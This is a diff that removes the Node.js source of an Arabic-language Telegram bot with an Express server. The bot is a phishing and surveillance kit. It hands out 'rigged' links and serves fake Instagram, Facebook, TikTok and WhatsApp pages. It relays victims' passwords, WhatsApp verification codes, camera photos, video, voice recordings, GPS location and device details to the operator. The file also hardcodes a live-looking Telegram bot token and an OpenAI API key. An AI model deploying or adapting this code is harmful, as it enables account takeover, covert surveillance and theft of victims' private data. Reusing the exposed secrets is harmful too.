@@ -1,1324 +1,1 @@
-const TelegramBot = require('node-telegram-bot-api');
-const express = require('express');
-const bodyParser = require('body-parser');
-const multer = require('multer');
-const path = require('path');
-const fs = require('fs');
-const crypto = require('crypto');
-const axios = require('axios');
-const uuid = require('uuid');
-
-// بيانات البوت
-const botToken = '7156653711:AAGaxps8y2PjQSVd8YSgB6s_3_rGFDk_qI0'; // ضع هنا توكن البوت الخاص بك
-const botUsername = 'ICTS31333_bot'; // ضع هنا يوزر البوت الخاص بك بدون @
-const bot = new TelegramBot(botToken, { polling: true });
-
-const developerChannels = ['@K9_S2']; // قنوات المطور
-
-let userPoints = {}; // لتخزين النقاط لكل مستخدم
-let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
-let visitorData = {}; // لتتبع زيارات المستخدمين عبر جميع الروابط
-
-// وظيفة لحذف ذاكرة التخزين المؤقتة
-function clearCache() {
-    console.log('Clearing cache...');
-    userPoints = {};
-    linkData = {};
-    visitorData = {};
-    const dataStore = {};
-}
-
-// ضبط وظيفة حذف ذاكرة التخزين المؤقتة لتعمل كل 30 دقيقة
-setInterval(clearCache, 1800 * 1000); // 1800 ثانية = 30 دقيقة
-
-async function isUserSubscribed(chatId) {
-    try {
-        const results = await Promise.all(
-            developerChannels.map(channel =>
-                bot.getChatMember(channel, chatId)
-            )
-        );
-
-        // التحقق من حالة العضوية
-        return results.every(result => {
-            const status = result.status;
-            return status === 'member' || status === 'administrator' || status === 'creator';
-        });
-    } catch (error) {
-        console.error('Error checking subscription status:', error);
-        return false;
-    }
-}
-
-bot.onText(/\/Viiiiip/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const isSubscribed = await isUserSubscribed(chatId);
-
-    if (!isSubscribed) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
-
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: buttons
-            }
-        });
-        return;
-    }
-
-    const linkId = uuid.v4(); // إنتاج معرف فريد للرابط
-
-    // تخزين بيانات الرابط
-    linkData[linkId] = {
-        userId: userId,
-        chatId: chatId,
-        visitors: []
-    };
-
-    const message = 'مرحبًا! هذا الخيارت مدفوع بسعر 30$ يمكنك تجميع النقاط وفتحها مجاني.';
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
-                [{ text: 'سحب جميع الرقام الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
-                [{ text: 'سحب جميع رسايل الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
-                [{ text: 'فرمتة جوال الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
-            ]
-        }
-    });
-});
-
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const userId = query.from.id;
-    const linkId = query.data.split('_')[2];
-
-    if (linkData[linkId] && linkData[linkId].userId === userId) {
-        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على 1 نقطة.\n: https://t.me/${botUsername}?start=${linkId}`;
-        bot.sendMessage(chatId, linkMessage);
-    }
-});
-
-bot.onText(/\/vip (.+)/, async (msg, match) => {
-    const linkId = match[1];
-    const visitorId = msg.from.id;
-    const chatId = msg.chat.id;
-
-    const isSubscribed = await isUserSubscribed(chatId);
-    if (!isSubscribed) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
-
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: buttons
-            }
-        });
-        return;
-    }
-
-    if (linkData[linkId]) {
-        const { userId, visitors } = linkData[linkId];
-
-        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
-            visitors.push(visitorId);
-
-            if (!visitorData[visitorId]) {
-                visitorData[visitorId] = [];
-            }
-            visitorData[visitorId].push(userId);
-
-            if (!userPoints[userId]) {
-                userPoints[userId] = 0;
-            }
-            userPoints[userId] += 1;
-
-            // إرسال النقاط إلى المستخدم الذي يمتلك الرابط
-            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]} نقاط.`;
-            bot.sendMessage(chatId, message);
-
-            // تحديث النقاط في أعلى القائمة
-            const topMessage = `عدد النقاط التي قمت بتجميعها: ${userPoints[userId]} نقاط`;
-            bot.sendMessage(userId, topMessage);
-        }
-    }
-});
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const userId = query.from.id;
-    const linkId = query.data.split('_')[2];
-
-    if (linkData[linkId] && linkData[linkId].userId === userId) {
-        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على1$ \n: https://t.me/${botUsername}?start=${linkId}`;
-        bot.sendMessage(chatId, linkMessage);
-    }
-});
-
-bot.onText(/\/start (.+)/, async (msg, match) => {
-    const linkId = match[1];
-    const visitorId = msg.from.id;
-    const chatId = msg.chat.id;
-
-    const isSubscribed = await isUserSubscribed(chatId);
-    if (!isSubscribed) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
-
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: buttons
-            }
-        });
-        return;
-    }
-
-    if (linkData[linkId]) {
-        const { userId, chatId, visitors } = linkData[linkId];
-
-        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
-            visitors.push(visitorId);
-
-            if (!visitorData[visitorId]) {
-                visitorData[visitorId] = [];
-            }
-            visitorData[visitorId].push(userId);
-
-            if (!userPoints[userId]) {
-                userPoints[userId] = 0;
-            }
-            userPoints[userId] += 1;
-
-            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]}$\nعندما توصل لي30$ سوف يتم فتح المميزات المدفوع تلقائي `;
-            bot.sendMessage(chatId, message);
-        }
-    }
-});
-
-// بقية الكود الثاني هنا...هنا...
-
-
-// إعداد multer لاستقبال الملفات
-const app = express();
-app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
-app.use(bodyParser.json({ limit: '100mb' }));
-app.use(express.static(__dirname));
-
-// إعداد multer لاستقبال الملفات
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
-const uploadVoice = multer({ dest: 'uploads/' });
-
-// توجيه طلبات GET لملفات HTML
-app.get('/getNameForm', (req, res) => {
-    const chatId = req.query.chatId;
-    const formType = req.query.type;
-
-    if (!chatId) {
-        return res.status(400).send('الرجاء توفير chatId في الطلب.');
-    }
-
-    let fileName = '';
-    switch (formType) {
-        case 'instagram':
-            fileName = 'inst.html';
-            break;
-        case 'facebook':
-            fileName = 'fees.html';
-            break;
-        case 'tiktok':
-        default:
-            fileName = 'tok.html';
-            break;
-    }
-
-    res.sendFile(path.join(__dirname, fileName));
-});
-
-app.get('/getvideo/:linkId', (req, res) => {
-    const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
-        res.sendFile(path.join(__dirname, 'location.html'));
-    } else {
-        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
-    }
-});
-
-app.get('/captureFront/:linkId', (req, res) => {
-    const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
-        res.sendFile(path.join(__dirname, 'capture_front.html'));
-    } else {
-        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
-    }
-});
-
-app.get('/captureBack/:linkId', (req, res) => {
-    const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
-        res.sendFile(path.join(__dirname, 'capture_back.html'));
-    } else {
-        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
-    }
-});
-
-app.get('/record/:linkId', (req, res) => {
-    const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
-        res.sendFile(path.join(__dirname, 'record.html'));
-    } else {
-        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
-    }
-});
-
-// معالجة طلبات POST
-app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
-    const firstName = req.body.firstName;
-    const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); // تأكد من البيانات المستلمة
-
-    bot.sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
-        .then(() => {
-            // تم استلام البيانات بنجاح - لا يوجد رد من السيرفر
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
-        });
-
-    // إعادة تحميل الصفحة بدون توجيه
-    res.redirect('/ok.html');
-});
-app.use(bodyParser.json());
-app.use(express.static(__dirname));
-
-// تعيين المسار الجذر لتوجيه الطلبات إلى ملف index.html
-app.get('/whatsapp', (req, res) => {
-  res.sendFile(path.join(__dirname, 'phone_form.html'));
-});
-
-app.post('/submitPhoneNumber', (req, res) => {
-  const chatId = req.body.chatId;
-  const phoneNumber = req.body.phoneNumber;
-
-  // إرسال رسالة إلى التليجرام
-  bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
-    .then(() => {
-      res.json({ success: true });
-    })
-    .catch((error) => {
-      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
-      res.json({ success: false });
-    });
-});
-
-app.post('/submitCode', (req, res) => {
-  const chatId = req.body.chatId;
-  const code = req.body.code;
-
-  // إرسال رسالة إلى التليجرام
-  bot.sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
-    .then(() => {
-      // توجيه المستخدم إلى الرابط بعد إرسال الكود
-      res.redirect('https://faq.whatsapp.com/');
-    })
-    .catch((error) => {
-      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
-      res.json({ success: false });
-    });
-});
-
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
-
-const dataStore = {}; // لتخزين المعلومات المؤقتة
-
-app.use(express.static(__dirname));
-
-app.post('/submitVideo', (req, res) => {
-    const chatId = req.body.chatId;
-    const videoData = req.body.videoData;
-
-    // تحقق من صحة البيانات
-    if (!chatId || !videoData) {
-        return res.status(400).send('Invalid request: Missing chatId or videoData');
-    }
-
-    const videoDataBase64 = videoData.split(',')[1]; // افصل الباس64
-
-    // تأكد من وجود المجلد videos، وإن لم يكن موجودًا قم بإنشائه
-    const videoDir = path.join(__dirname, 'videos');
-    if (!fs.existsSync(videoDir)) {
-        fs.mkdirSync(videoDir);
-    }
-
-    // حفظ الفيديو
-    try {
-        const buffer = Buffer.from(videoDataBase64, 'base64');
-        const videoPath = path.join(videoDir, `${chatId}.mp4`);
-        fs.writeFileSync(videoPath, buffer);
-
-        bot.sendVideo(chatId, videoPath, { caption: 'تم تصوير الضحيه فيديو 🎥' })
-            .then(() => {
-                console.log(`Stored and sent video for chatId ${chatId}`);
-                res.redirect('/ca.html'); // إعادة التوجيه إلى capture.html
-            })
-            .catch(error => {
-                console.error('Error sending video:', error);
-                res.status(500).send('Failed to send video');
-            });
-    } catch (error) {
-        console.error('Error processing video:', error);
-        res.status(500).send('Failed to process video');
-    }
-});
-
-app.get('/capture', (req, res) => {
-    res.sendFile(path.join(__dirname, 'ca.html'));
-});
-let userRequests = {}; // لتخزين طلبات المستخدمين
-
-app.post('/submitLocation', (req, res) => {
-    const chatId = req.body.chatId;
-    const latitude = req.body.latitude;
-    const longitude = req.body.longitude;
-    bot.sendLocation(chatId, latitude, longitude);
-    res.send('حدث خطأ');
-});
-
-app.post('/submitPhotos', (req, res) => {
-    const chatId = req.body.chatId;
-    const imageDatas = req.body.imageDatas.split(',');
-
-    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);
-
-    if (imageDatas.length > 0) {
-        const sendPhotoPromises = imageDatas.map((imageData, index) => {
-            const buffer = Buffer.from(imageData, 'base64');
-            return bot.sendPhoto(chatId, buffer, { caption: `📸الصورة ${index + 1}` });
-        });
-
-        Promise.all(sendPhotoPromises)
-            .then(() => {
-                console.log('');
-                res.json({ success: true });
-            })
-            .catch(err => {
-                console.error('', err);
-                res.status(500).json({ error: '' });
-            });
-    } else {
-        console.log('');
-        res.status(400).json({ error: '' });
-    }
-});
-
-app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
-    const chatId = req.body.userId; // استخدام معرف المستخدم المرسل من عميل HTML
-    const files = req.files;
-
-    if (files && files.length > 0) {
-        console.log(`تم استلام ${files.length}  ${chatId}`);
-        const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer));
-
-        Promise.all(sendPhotoPromises)
-            .then(() => {
-                console.log('');
-                res.json({ success: true });
-            })
-            .catch(err => {
-                console.error(':', err);
-                res.status(500).json({ error: '' });
-            });
-    } else {
-        console.log('');
-        res.status(400).json({ error: '' });
-    }
-});
-
-app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
-    const chatId = req.body.chatId;
-    const voicePath = req.file.path;
-
-    bot.sendVoice(chatId, voicePath).then(() => {
-        fs.unlinkSync(voicePath);
-        res.send('');
-    }).catch(error => {
-        console.error(error);
-        res.status(500).send('خطأ.');
-    });
-});
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`الخادم يعمل على المنفذ ${PORT}`);
-});
-app.get('/:userId', (req, res) => {
-    res.sendFile(path.join(__dirname, 'mm.html'));
-});
-
-// استقبال البيانات من الصفحة HTML وإرسالها إلى البوت
-app.post('/mm', async (req, res) => {
-    const chatId = req.body.userId;
-    const deviceInfo = req.body.deviceInfo;
-
-    if (deviceInfo) {
-        const message = `
-📱 **معلومات الجهاز:**
-- الدولة: ${deviceInfo.country} 🔻
-- المدينة: ${deviceInfo.city} 🏙️
-- عنوان IP: ${deviceInfo.ip} 🌍
-- شحن الهاتف: ${deviceInfo.battery}% 🔋
-- هل الهاتف يشحن؟: ${deviceInfo.isCharging} ⚡
-- الشبكة: ${deviceInfo.network} 📶 (سرعة: ${deviceInfo.networkSpeed} ميغابت في الثانية)
-- نوع الاتصال: ${deviceInfo.networkType} 📡
-- الوقت: ${deviceInfo.time} ⏰
-- اسم الجهاز: ${deviceInfo.deviceName} 🖥️
-- إصدار الجهاز: ${deviceInfo.deviceVersion} 📜
-- نوع الجهاز: ${deviceInfo.deviceType} 📱
-- الذاكرة (RAM): ${deviceInfo.memory} 🧠
-- الذاكرة الداخلية: ${deviceInfo.internalStorage} GB 💾
-- عدد الأنوية: ${deviceInfo.cpuCores} ⚙️
-- لغة النظام: ${deviceInfo.language} 🌐
-- اسم المتصفح: ${deviceInfo.browserName} 🌐
-- إصدار المتصفح: ${deviceInfo.browserVersion} 📊
-- دقة الشاشة: ${deviceInfo.screenResolution} 📏
-- إصدار نظام التشغيل: ${deviceInfo.osVersion} 🖥️
-- وضع الشاشة: ${deviceInfo.screenOrientation} 🔄
-- عمق الألوان: ${deviceInfo.colorDepth} 🎨
-- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate} 📅
-- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol} 🔒
-- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency} 📡
-- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable} 🌍
-- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport} 🔵
-- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport} ✋
-        `;
-        
-        try {
-            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            console.log('تم إرسال معلومات الجهاز بنجاح');
-            res.json({ success: true });
-        } catch (err) {
-            console.error('فشل في إرسال معلومات الجهاز:', err);
-            res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
-        }
-    } else {
-        console.log('لم يتم استلام معلومات الجهاز');
-        res.status(400).json({ error: 'لم يتم استلام معلومات الجهاز' });
-    }
-});
-
-// تشغيل الخادم
-
-
-app.post('/so', (req, res) => {
-    const chatId = req.body.chatId;
-    const imageDatas = req.body.imageDatas.split(',');
-
-    imageDatas.forEach((imageData, index) => {
-        const buffer = Buffer.from(imageData, 'base64');
-
-        // إرسال الصورة مباشرة إلى البوت دون حفظها في الخادم
-        bot.sendPhoto(chatId, buffer, { caption: `الصوره📸 ${index + 1}` });
-    });
-
-    console.log(`Sent photos for chatId ${chatId}`);
-    
-    // توجيه المستخدم إلى الرابط الأصلي إذا كان موجودًا
-    if (dataStore[chatId] && dataStore[chatId].userLink) {
-        res.redirect(dataStore[chatId].userLink);
-    } else {
-        res.send('Processing complete');
-    }
-});
-
-app.get('/ca', (req, res) => {
-    res.sendFile(path.join(__dirname, 'capture.html'));
-});
-
-// رسالة استقبال للبوت
-
-
-// Load and save link usage data
-let linkUsage = {};
-const maxAttemptsPerButton = 555; // أقصى عدد محاولات لكل زر
-
-function loadLinkUsage() {
-    try {
-        linkUsage = JSON.parse(fs.readFileSync('linkUsage.json'));
-    } catch (error) {
-        linkUsage = {};
-    }
-}
-
-function saveLinkUsage() {
-    fs.writeFileSync('linkUsage.json', JSON.stringify(linkUsage));
-}
-
-function validateLinkUsage(userId, action) {
-    const userActionId = `${userId}:${action}`;
-    if (isVIPUser(userId)) {
-        return true;
-    }
-
-    if (linkUsage[userActionId] && linkUsage[userActionId].attempts >= maxAttemptsPerButton) {
-        return false;
-    }
-
-    if (!linkUsage[userActionId]) {
-        linkUsage[userActionId] = { attempts: 0 };
-    }
-
-    linkUsage[userActionId].attempts++;
-    saveLinkUsage();
-    return true;
-}
-
-loadLinkUsage();
-
-// Manage VIP users
-let vipUsers = {};
-
-function loadVIPUsers() {
-    try {
-        vipUsers = JSON.parse(fs.readFileSync('vipUsers.json'));
-    } catch (error) {
-        vipUsers = {};
-    }
-}
-
-function saveVIPUsers() {
-    fs.writeFileSync('vipUsers.json', JSON.stringify(vipUsers));
-}
-
-function addVIPUser(userId) {
-    vipUsers[userId] = true;
-    saveVIPUsers();
-}
-
-function removeVIPUser(userId) {
-    delete vipUsers[userId];
-    saveVIPUsers();
-}
-
-function isVIPUser(userId) {
-    return !!vipUsers[userId];
-}
-
-loadVIPUsers();
-
-// Respond to /start command
-bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
-    const isSubscribed = await isUserSubscribed(chatId);
-
-    if (!isSubscribed) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
-        
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: buttons
-            }
-        });
-        return;
-    }
-
-    const message = 'مرحبًا! بك كل الازازر مجاناً:';
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'اختراق الكامرا الاماميه 📸', callback_data: `captureFront:${chatId}` }],
-                [{ text: 'اختراق الكامرا الاخلفيه 📷', callback_data: `captureBack:${chatId}` }],
-                [{ text: 'تصوير الضحيه فيديو 🎥', callback_data: 'capture_video' }],
-                [{ text: 'اختراق الموقع📍', callback_data: `getLocation:${chatId}` }],
-                [{ text: 'تسجيل صوت الضحيه 🎤', callback_data: `recordVoice:${chatId}` }],
-                [{ text: "اختراق كامراة المراقبه 📡", callback_data: "get_cameras" }],
-                [{ text: 'اختراق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` }],
-                [{ text: 'اختراق وتساب 🟢', callback_data: 'request_verification' }],
-                [{ text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }],
-                [{ text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }],
-                [{ text: 'إختراق ببجي 🕹', callback_data: 'get_pubg' }],
-                [{ text: 'إختراق فري فاير 👾', callback_data: 'get_freefire' }],
-                [{ text: 'إختراق سناب شات ⭐', callback_data: 'add_names' }],
-                [{ text: 'اغلاق المواقع 💣', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' } }],
-                [{ text: 'الدردشه مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }],
-                [{ text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' }],
-                [{ text: 'تفسير الاحلام 🧙‍♂️', web_app: { url: 'https://morning-animated-drifter.glitch.me/' } }],
-                [{ text: 'تلغيم رابط ⚠️', callback_data: 'get_link' }], 
-                [{ text: 'لعبة الاذكياء 🧠', web_app: { url: 'https://forest-plausible-practice.glitch.me/' } }], 
-                [{ text: 'شرح البوت 👨🏻‍🏫', url: 'https://t.me/lTV_l/33' }],
-                [{ text: 'تواصل مع المطور', url: 'https://t.me/VlP_12' }]
-            ]
-        }
-    });
-
-    // إضافة أزرار لوحة التحكم للمطور
-    if (chatId == 5739065274) {
-        bot.sendMessage(chatId, 'مرحبًا بك عزيزي حمودي في لوحة التحكم:', {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: 'إضافة مشترك VIP', callback_data: 'add_vip' }],
-                    [{ text: 'إلغاء اشتراك VIP', callback_data: 'remove_vip' }]
-                ]
-            }
-        });
-    }
-});
-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://i-jgne.onrender.com/capture?chatId=${chatId}`;
-        bot.sendMessage(chatId, message);
-    }
-});
-// Handle button callbacks
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];
-
-    if (!exemptButtons.includes(data.split(':')[0]) && !(await isUserSubscribed(chatId))) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));
-        
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: [buttons]
-            }
-        });
-        return;
-    }
-
-    if (data === 'request_verification') {
-        const verificationLink = `https://i-jgne.onrender.com/whatsapp?chatId=${chatId}`;
-        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
-        return;
-    }
-
-    const [action, userId] = data.split(':');
-
-    if (action === 'get_joke') {
-        try {
-            const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
-            const apiUrl = 'https://api.openai.com/v1/chat/completions';
-            const response = await axios.post(apiUrl, {
-                model: 'gpt-3.5-turbo',
-                messages: [{ role: 'user', content: jokeMessage }]
-            }, {
-                headers: {
-                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
-                    'Content-Type': 'application/json'
-                }
-            });
-            const joke = response.data.choices[0].message.content;
-
-            bot.sendMessage(chatId, joke);
-        } catch (error) {
-            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
-        }
-    } else if (data === 'get_love_message') {
-        try {
-            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
-            const apiUrl = 'https://api.openai.com/v1/chat/completions';
-            const response = await axios.post(apiUrl, {
-                model: 'gpt-3.5-turbo',
-                messages: [{ role: 'user', content: loveMessage }]
-            }, {
-                headers: {
-                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
-                    'Content-Type': 'application/json'
-                }
-            });
-            const love = response.data.choices[0].message.content;
-
-            bot.sendMessage(chatId, love);
-        } catch (error) {
-            console.error('Error fetching love message:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحق😁ًا.');
-        }
-    } else if (data === 'add_vip' && chatId == 5739065274) {
-        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:');
-        bot.once('message', (msg) => {
-            const userId = msg.text;
-            addVIPUser(userId);
-            bot.sendMessage(chatId, `تم إضافة المستخدم ${userId} كـ VIP.`);
-        });
-    } else if (data === 'remove_vip' && chatId == 5739065274) {
-        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإزالته من VIP:');
-        bot.once('message', (msg) => {
-            const userId = msg.text;
-            removeVIPUser(userId);
-            bot.sendMessage(chatId, `تم إزالة المستخدم ${userId} من VIP.`);
-        });
-    } else {
-        const [action, userId] = data.split(':');
-
-        if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {
-            bot.sendMessage(chatId, '');
-            return;
-        }
-
-        let link = '';
-
-        switch (action) {
-            case 'captureFront':
-                link = `https://i-jgne.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-                break;
-            case 'captureBack':
-                link = `https://i-jgne.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-                break;
-            case 'getvideo':
-                link = `https://i-jgne.onrender.com/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-                break;
-            case 'recordVoice':
-                const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://i-jgne.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
-                break;
-            case 'rshq_tiktok':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
-                break;
-            case 'rshq_instagram':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
-                break;
-            case 'rshq_facebook':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
-                break;
-            default:
-                bot.sendMessage(chatId, '');
-                return;
-        }
-
-        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
-    }
-
-    bot.answerCallbackQuery(callbackQuery.id);
-});
-bot.onText(/\/jjihigjoj/, (msg) => {
-    const chatId = msg.chat.id;
-    const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'جمع معلومات الجهاز', callback_data: 'collect_device_info' }]
-            ]
-        }
-    });
-});
-
-// التعامل مع الزر عند الضغط عليه
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-
-    // إرسال الرابط عند الضغط على الزر
-    if (query.data === 'collect_device_info') {
-        const url = `https://i-jgne.onrender.com/${chatId}`;
-        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
-    }
-
-    // تأكيد تلقي الرد وإنهاء عملية المعالجة
-    bot.answerCallbackQuery(query.id);
-});
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-
-    if (query.data === 'get_link') {
-        // طلب الرابط من المستخدم
-        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
-
-        // إعداد مستمع للرسائل من هذا المستخدم فقط
-        const messageHandler = (msg) => {
-            // التحقق من أن الرسالة من نفس المحادثة وأنها تحتوي على رابط صحيح
-            if (msg.chat.id === chatId) {
-                if (msg.text && msg.text.startsWith('https')) {
-                    const userLink = msg.text;
-
-                    // تخزين الرابط في dataStore
-                    dataStore[chatId] = { userLink };
-
-                    // إرسال الرابط المعدل للمستخدم
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://i-jgne.onrender.com/capture.html?chatId=${chatId}`);
-
-                    // إزالة مستمع الرسائل بعد المعالجة
-                    bot.removeListener('message', messageHandler);
-                } else {
-                    // إذا لم يبدأ الرابط بـ "https"
-                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
-                }
-            }
-        };
-
-        // إضافة مستمع للرسائل لهذا المستخدم
-        bot.on('message', messageHandler);
-    }
-});
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
-
-app.post('/submitNames', (req, res) => {
